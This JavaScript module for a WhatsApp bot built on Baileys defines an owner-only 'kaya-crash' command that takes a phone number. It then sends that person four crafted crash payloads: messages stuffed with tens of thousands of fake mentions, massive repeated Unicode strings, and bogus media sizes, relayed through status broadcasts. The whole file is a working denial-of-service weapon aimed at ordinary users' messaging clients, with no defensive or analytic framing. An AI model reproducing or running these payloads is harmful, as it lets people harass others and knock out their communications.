import { generateWAMessageFromContent } from '@whiskeysockets/baileys';
import { getBotName, sendWithBotImage } from '../setting/botAssets.js';
import { getContextInfo } from '../setting/contextInfo.js';

export default {
    name: 'kaya-crash',
    description: '💥 Execute crash payloads on a specified target',
    category: 'Owner',

    async execute(kaya, mek, from, args, prefix) {
        try {
            // 1. Clean retrieval of the bot ID
            const botId = kaya.user?.id ? kaya.user.id.split(':')[0].replace(/[^0-9]/g, '') : '';

            // 2. Correct identification of the sender
            const senderJid = mek.sender || mek.key.participant || mek.key.remoteJid || '';
            const senderId = senderJid.split(':')[0].replace(/[^0-9]/g, '');

            // 3. Check if the sender is the owner
            const isOwner = senderId === botId;
            const botName = getBotName(mek.sender);

            if (!isOwner) {
                return await sendWithBotImage(kaya, from, mek.sender, { text: `❌ Only the bot owner can execute this command.` }, { quoted: mek });
            }

            // Retrieve target from arguments or quoted message
            let inputTarget = args[0];
            if (!inputTarget && mek.message?.extendedTextMessage?.contextInfo?.participant) {
                inputTarget = mek.message.extendedTextMessage.contextInfo.participant;
            } else if (!inputTarget && mek.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]) {
                inputTarget = mek.message.extendedTextMessage.contextInfo.mentionedJid[0];
            }

            if (!inputTarget) {
                const usageText = `▉ \`${botName}\` ▉\n▰▰▰▰▰▰▰▰▰▰▰▰▰\n*💥 CRASH COMMAND*\n\nUsage:\n• \`${prefix}kaya-crash <phone_number>\`\n• Or reply to a user's message with \`${prefix}kaya-crash\``;
                return await sendWithBotImage(kaya, from, mek.sender, { caption: usageText, contextInfo: getContextInfo(mek.sender) }, { quoted: mek });
            }

            // Format target JID properly
            let target = inputTarget.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

            await kaya.sendMessage(from, { text: `⚡ Sending crash payloads to ${inputTarget}...` }, { quoted: mek });

            // Client alias for crash functions
            const gulbat = kaya;

            // Crash payload definitions
            async function bulldozer(target) {
                let message = {
                    viewOnceMessage: {
                        message: {
                            stickerMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
                                fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                                fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                                mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                                mimetype: "image/webp",
                                directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                                fileLength: { low: 1, high: 0, unsigned: true },
                                mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
                                firstFrameLength: 19904,
                                firstFrameSidecar: "KN4kQ5pyABRAgA==",
                                isAnimated: true,
                                contextInfo: {
                                    mentionedJid: [
                                        "0@s.whatsapp.net",
                                        ...Array.from({ length: 40000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
                                    ],
                                    groupMentions: [],
                                    entryPointConversionSource: "non_contact",
                                    entryPointConversionApp: "whatsapp",
                                    entryPointConversionDelaySeconds: 467593,
                                },
                                stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
                                isAvatar: false,
                                isAiSticker: false,
                                isLottie: false,
                            },
                        },
                    },
                };

                const msg = generateWAMessageFromContent(target, message, {});
                await gulbat.relayMessage("status@broadcast", msg.message, {
                    messageId: msg.key.id,
                    statusJidList: [target],
                    additionalNodes: [{
                        tag: "meta",
                        attrs: {},
                        content: [{
                            tag: "mentioned_users",
                            attrs: {},
                            content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                        }]
                    }]
                });
            }

            async function VampireBlank(target, ptcp = true) {
                const Vampire = `_*~@8~*_\n`.repeat(10500);
                const CrashNotif = 'ꦽ'.repeat(55555);

                await gulbat.relayMessage(
                    target,
                    {
                        ephemeralMessage: {
                            message: {
                                interactiveMessage: {
                                    header: {
                                        documentMessage: {
                                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                                            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                            fileLength: "9999999999999",
                                            pageCount: 1316134911,
                                            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                                            fileName: "𝐕𝐚𝐦𝐩𝐢𝐫𝐞",
                                            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                                            directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                                            mediaKeyTimestamp: "1726867151",
                                            contactVcard: true,
                                            jpegThumbnail: null,
                                        },
                                        hasMediaAttachment: true,
                                    },
                                    body: { text: '𝐕𝐚𝐦𝐩𝐢𝐫𝐞 𝐇𝐞𝐫𝐞' + CrashNotif + Vampire },
                                    footer: { text: '' },
                                    contextInfo: {
                                        mentionedJid: [
                                            "0@s.whatsapp.net",
                                            ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
                                        ],
                                        forwardingScore: 1,
                                        isForwarded: true,
                                        fromMe: false,
                                        participant: "0@s.whatsapp.net",
                                        remoteJid: "status@broadcast",
                                        quotedMessage: {
                                            documentMessage: {
                                                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                                fileLength: "9999999999999",
                                                pageCount: 1316134911,
                                                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                                fileName: "𝐕𝐚𝐦𝐩𝐢𝐫𝐞",
                                                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                                mediaKeyTimestamp: "1724474503",
                                                contactVcard: true,
                                                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                                jpegThumbnail: "",
                                            },
                                        },
                                    },
                                },
                            },
                        },
                    },
                    ptcp ? { participant: { jid: target } } : {}
                );
            }

            async function protocolbug3(target, shibal) {
                const rapip = generateWAMessageFromContent(target, {
                    viewOnceMessage: {
                        message: {
                            videoMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                                mimetype: "video/mp4",
                                fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                                fileLength: "999999",
                                seconds: 999999,
                                mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                                caption: "(🐉) Specter Raflie X",
                                height: 999999,
                                width: 999999,
                                fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                                directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1743742853",
                                contextInfo: {
                                    isSampled: true,
                                    mentionedJid: ["13135550002@s.whatsapp.net", ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")]
                                },
                                streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                                thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                                thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                                thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                                annotations: [{
                                    embeddedContent: {
                                        embeddedMusic: {
                                            musicContentMediaId: "kontol",
                                            songId: "peler",
                                            author: ".Tama Ryuichi",
                                            title: "Finix",
                                            artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                            artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                            artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                            artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                            countryBlocklist: true,
                                            isExplicit: true,
                                            artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                        }
                                    },
                                    embeddedAction: null
                                }]
                            }
                        }
                    }
                }, {});
                await gulbat.relayMessage("status@broadcast", rapip.message, {
                    messageId: rapip.key.id,
                    statusJidList: [target],
                    additionalNodes: [{
                        tag: "meta",
                        attrs: {},
                        content: [{
                            tag: "mentioned_users",
                            attrs: {},
                            content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                        }]
                    }]
                });
                if (shibal) {
                    await gulbat.relayMessage(target, {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: { key: rapip.key, type: 25 }
                            }
                        }
                    }, {
                        additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
                    });
                }
            }

            async function protocolbug5(isTarget, mention) {
                const mentionedList = ["13135550002@s.whatsapp.net", ...Array.from({ length: 40000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)];
                const videoMessage = {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
                    fileLength: "289511",
                    seconds: 15,
                    mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
                    caption: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌄𐍄𐍉𐍂",
                    height: 640,
                    width: 640,
                    fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
                    directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743848703",
                    contextInfo: { isSampled: true, mentionedJid: mentionedList },
                    forwardedNewsletterMessageInfo: { newsletterJid: "120363321780343299@newsletter", serverMessageId: 1, newsletterName: "༿༑ᜳ𝗥‌𝗬𝗨‌𝗜‌𝗖‌‌‌𝗛‌𝗜‌ᢶ⃟" }
                };

                const msg = generateWAMessageFromContent(isTarget, { viewOnceMessage: { message: { videoMessage } } }, {});
                await gulbat.relayMessage("status@broadcast", msg.message, {
                    messageId: msg.key.id,
                    statusJidList: [isTarget],
                    additionalNodes: [{
                        tag: "meta",
                        attrs: {},
                        content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: isTarget }, content: undefined }] }]
                    }]
                });

                if (mention) {
                    await gulbat.relayMessage(isTarget, {
                        groupStatusMentionMessage: {
                            message: { protocolMessage: { key: msg.key, type: 25 } }
                        }
                    }, {
                        additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }]
                    });
                }
            }

            // Execute all crash payloads on the target
            await bulldozer(target).catch(() => {});
            await VampireBlank(target, true).catch(() => {});
            await protocolbug3(target, true).catch(() => {});
            await protocolbug5(target, true).catch(() => {});

            return await kaya.sendMessage(from, { text: `✅ Crash attack successfully executed on ${inputTarget}.` }, { quoted: mek });

        } catch (err) {
            console.error('❌ Error in kaya-crash:', err);
            await kaya.sendMessage(from, { text: `⚠️ An error occurred while executing the crash.` }, { quoted: mek });
        }
    }
};
